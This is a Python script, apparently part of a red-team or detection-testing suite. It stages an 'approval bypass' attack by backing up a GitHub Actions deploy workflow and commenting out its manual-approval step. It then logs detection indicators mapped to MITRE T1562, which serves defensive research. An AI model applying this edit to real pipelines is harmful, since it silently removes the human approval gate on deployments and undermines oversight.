#!/usr/bin/env python3
"""Attack Scenario 7.1: Workflow Approval Bypass"""
import sys, json, shutil
from pathlib import Path
from datetime import datetime

class ApprovalBypassAttack:
    def __init__(self):
        self.repo_root = Path(__file__).parent.parent.parent.parent
        self.workflow = self.repo_root / ".github" / "workflows" / "deploy.yml"
        self.backup_suffix = datetime.now().strftime('%Y%m%d_%H%M%S')

    def bypass_approval(self):
        if not self.workflow.exists():
            self.workflow.parent.mkdir(parents=True, exist_ok=True)
            with open(self.workflow, 'w') as f:
                f.write('''name: Deploy
on: [push]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Wait for approval
        uses: trstringer/manual-approval@v1
      - name: Deploy
        run: echo "Deploying..."
''')

        backup = self.workflow.parent / f"{self.workflow.name}.backup.{self.backup_suffix}"
        shutil.copy(self.workflow, backup)

        with open(self.workflow, 'r') as f:
            content = f.read()

        # Comment out approval step
        content = content.replace(
            'uses: trstringer/manual-approval@v1',
            '# uses: trstringer/manual-approval@v1  # RESEARCH ATTACK: Bypassed'
        )

        with open(self.workflow, 'w') as f:
            f.write(content)

        return True

    def log_indicators(self):
        indicators = {
            "attack_type": "approval_bypass",
            "scenario_id": "7.1",
            "timestamp": datetime.now().isoformat(),
            "indicators": {
                "workflow_modified": True,
                "approval_step_removed": True,
                "protection_bypass": True
            },
            "expected_detection": {"difficulty": "easy", "primary_signals": ["workflow_modification", "approval_removal"]},
            "mitre_attack": {"technique": "T1562", "name": "Impair Defenses"}
        }

        log_dir = Path(__file__).parent.parent / "logs" / "indicators"
        log_dir.mkdir(parents=True, exist_ok=True)
        with open(log_dir / f"approval_bypass_{self.backup_suffix}.json", 'w') as f:
            json.dump(indicators, f, indent=2)

        return indicators

    def execute(self):
        print("=" * 80 + "\nATTACK SCENARIO 7.1: Approval Bypass\n")
        self.bypass_approval()
        indicators = self.log_indicators()
        print(f"[OK] Status: SUCCESS\n" + "=" * 80)
        return True

if __name__ == "__main__":
    sys.exit(0 if ApprovalBypassAttack().execute() else 1)
